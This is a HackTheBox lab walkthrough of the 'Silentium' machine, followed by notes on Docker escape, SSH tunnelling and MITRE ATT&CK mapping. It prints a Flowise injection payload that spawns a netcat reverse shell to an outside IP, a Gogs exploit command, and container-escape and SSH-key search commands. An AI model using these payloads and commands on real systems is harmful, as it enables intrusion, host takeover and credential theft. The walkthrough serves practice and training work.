---
title: "HackTheBox - Silentium Walkthrough"
date: 2026-04-26 00:00:00 +0000
categories: [Walkthroughs, HackTheBox]
tags: [linux, prototype-pollution, rce]
---


# Silentium

https://app.hackthebox.com/machines/Silentium?sort_by=created_at&sort_type=desc

---

## walk-through

### **01 — Reconnaissance & Subdomain Discovery**

- **Vhost Enumeration:** Identified `staging.silentium.htb` as a hidden development environment.

```php
gobuster vhost -u "<http://silentium.htb>" -w bitquark-subdomains-top100000.txt --append-domain
```

### **02 — Static JS Analysis & Client-Side Bypass**

- **Analysis: find api —> ATO**

---

### **03 — Authenticated RCE (Flowise MCP Injection CVE )**

- **Vector:** Post-ATO, used the Bearer token to hit `/api/v1/node-load-method/customMCP`.
- **Payload:** Injected a Node.js `child_process` payload to break the sandbox and execute a reverse shell.
- **JSON Body:**

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 4444 >/tmp/f');return 1;})()})"
  }
}
```

---

### **04 — Full Docker Escape Methodology**

Once inside a container as `root`, follow this checklist to escape to the Host:

- **A. Information Leakage (What we used):** Check `env` or `/proc/self/environ` for hardcoded creds (SSH/DB).
- **B. Exploiting Privileged Mode:** Check for `Disk` devices. If the container is privileged, you can mount the host's drive.
    - **Command:** `fdisk -l` -> `mount /dev/sda1 /mnt` -> `chroot /mnt`
- **C. Docker Socket Abuse:** Look for `/var/run/docker.sock`. If present, use it to spawn a new container with the host's root directory mounted.
    - **Command:** `docker run -v /:/host -it ubuntu chroot /host`
- **D. Capability Abuse:** Check for dangerous capabilities.
    - **Command:** `capsh --print` (Look for `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, or `CAP_DAC_READ_SEARCH`).
- **E. Sensitive Files:** Search for SSH keys or configuration files.
    - **Command:** `find / -name "id_rsa" 2>/dev/null` or `find / -name "*.conf"`

---

### **05 — Internal Enumeration & SSH Tunneling**

https://www.youtube.com/watch?v=rLppe_DDAMg&list=PL5dZpxpUkHPOeYRHNLOCapZssjgwG6lVr&index=52

- **Discovery:** Identified a local-only Gogs service (Internal Port 3001).
- **Command:** `netstat -tlpn` (on host)
- **Pivoting:** Created an SSH tunnel to bypass the firewall and access the Gogs UI from the attacker's machine.
- **Command:** `ssh -L 3001:127.0.0.1:3001 ben@10.129.x.x`

---

### **06 — Privilege Escalation (CVE-2025-8110)**

- **Vulnerability:** Symlink-based RCE in Gogs allowing `sshCommand` injection into `.git/config`.
- **Execution:** Automated the process (Account Creation -> Repo Creation -> Symlink Upload -> Config Overwrite) to trigger the RCE as the user running Gogs (**root**).
- **Command:** `python3 exploit.py -u <http://localhost:3001> -un hacked -pw hacked -t [TOKEN] -lh [IP] -lp 4444`

---

### **07 — Root Access**

- **Final Result:** Caught the reverse shell and retrieved `root.txt`.
- **Command:** `nc -lvnp 4444` -> `whoami` (root).

---

## lessons

## **Escape to Host**

https://wizardcyber.com/escaping-docker-container-an-attackers-perspective/

```bash
# prove that we are in container 
cat /proc/1/cgroup
ls -la /.dockerenv
id 
# Enumerating Docker Capabilities
capsh –-print # if onile or capsh thier 

cat /proc/self/status | grep CapEff # if offline take num 
CapEff: 00000000a00425fb
capsh --decode=00000000a00425fb # run it on your machine 

# Sensitive Files:
find / -name "id_rsa" 2>/dev/null 
find / -name "*.conf"
```

## **Tunneling**

## **1. Local Port Forwarding (`L`)**

### **1. Scenario**

You found a specific service (like a Database, a Web panel, or an MCP server) running inside the target machine, but it only listens on `localhost`. You want to access it using tools on your Kali Linux (like a browser or SQLMap).

### **2. What do you see? (Enumeration)**

You run `netstat` or `ss` and see a port listening on `127.0.0.1`:

```bash
user@target:~$ netstat -tulpn
(Not all processes could be identified)
Proto Local Address           Foreign Address         State       PID/Program name    
tcp   127.0.0.1:3306          0.0.0.0:* LISTEN      -                   
tcp   127.0.0.1:5555          0.0.0.0:* LISTEN      -
```

**Decision:** I need to bring port `5555` from the server to my machine.

### **3. Command & Parameters**

$$ssh -L 4444:127.0.0.1:5555 user@target-ip$$

- **`L`**: Local forward (Bring **to** me).
- **`4444`**: The port that will open on **your Kali**.
- **`127.0.0.1:5555`**: The destination IP and port as seen **by the server**.
- **`user@target-ip`**: Your access to the pivot host.

---

## **2. Remote Port Forwarding (`R`)**

### **1. Scenario**

The target machine is isolated or behind a firewall and cannot reach your Kali IP directly. You want to host a file or a listener (Reverse Shell) on your Kali and make the server "see" it as if it were local.

### **2. What do you see? (Enumeration)**

You try to `ping` or `curl` your Kali IP from the server and it fails:

```bash
user@target:~$ curl http://10.10.14.5/shell.sh
curl: (7) Failed to connect to 10.10.14.5 port 80: Connection timed out
```

**Decision:** I will open a tunnel that lets the server talk to me through the existing SSH connection.

### **3. Command & Parameters**

$$ssh -R 8888:127.0.0.1:80 user@target-ip$$

- **`R`**: Remote forward (Take **from** me to them).
- **`8888`**: The port that will open on **the target server**.
- **`127.0.0.1:80`**: Your Kali's local service (e.g., Python web server).
- **`user@target-ip`**: The server you are connecting to.

---

## **3. Dynamic Port Forwarding (`D`)**

### **1. Scenario**

The target machine has a second network interface (NIC) connected to an internal LAN (e.g., `192.168.2.0/24`). You want to scan the entire internal network, not just one port.

### **2. What do you see? (Enumeration)**

You check the network interfaces and see a hidden subnet:

```bash
user@target:~$ ip a
1: lo: <LOOPBACK...> 
2: eth0: <10.10.10.150...> # The one you used to get in
3: eth1: <192.168.2.15...> # The internal "Gold Mine"
```

**Decision:** I will turn the server into a SOCKS Proxy to route all my traffic through it.

### **3. Command & Parameters**

$$ssh -D 1080 user@target-ip$$

- **`D`**: Dynamic forward (SOCKS Proxy).
- **`1080`**: The local port on your Kali to be used with `proxychains`.
- **`user@target-ip`**: The pivot host.
- **Note:** You must add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf`.

---

## **4. Jump Host (`J`)**

### **1. Scenario**

You have access to **Server A**, and from **Server A** you can SSH into **Server B**. You want to access a service on **Server B** directly from your Kali without manually logging into each one.

### **2. What do you see? (Enumeration)**

You are on **Server A** and find you can reach another machine:

```bash
user@ServerA:~$ ssh user@192.168.2.10 # This works!
```

**Decision:** I will use the "Jump" flag to chain the connection.

### **3. Command & Parameters**

$$ssh -J userA@10.10.10.150 userB@192.168.2.10 -L 8080:127.0.0.1:80$$

- **`J`**: Jump through this intermediate host.
- **`userA@...`**: The first hop (Public/Accessible).
- **`userB@...`**: The final destination (Internal).
- **`L`**: (Optional) You can still add a port forward to the final destination.

---

## **Quick Checklist for your next Machine:**

1. **Check `ip a`**: Any hidden networks? $\rightarrow$ **`D`**.
2. **Check `netstat -tlpn`**: Any hidden local ports? $\rightarrow$ **`L`**.
3. **Check Outbound**: Can the server see my IP? No? $\rightarrow$ **`R`**.

**Do you want to see how to do these same tricks using Chisel for cases where SSH is blocked by the WAF or Firewall?**

## Reading

| **المرحلة في MITRE** | **الفنية (Technique)** | **اللي إنت بتعمله فعلياً** |
| --- | --- | --- |
| **Discovery** | **Network Service Scanning (T1046)** | لما تعمل `netstat` أو `nmap` للشبكة الداخلية بعد الهروب. |
| **Privilege Escalation** | **Escape to Host (T1611)** | الهروب من الكونتينر للـ Host اللي إنت لسه باعت صورته. |
| **Lateral Movement** | **Internal Proxy (T1090.001)** | هنا بقى الـ **SSH Tunneling**؛ بتستخدم الـ Host كنفق للوصول لأجهزة تانية. |
| **Command and Control** | **Protocol Tunneling (T1572)** | لو الـ Tunneling ده غرضه إنك تطلع Reverse Shell لبره الشبكة. |
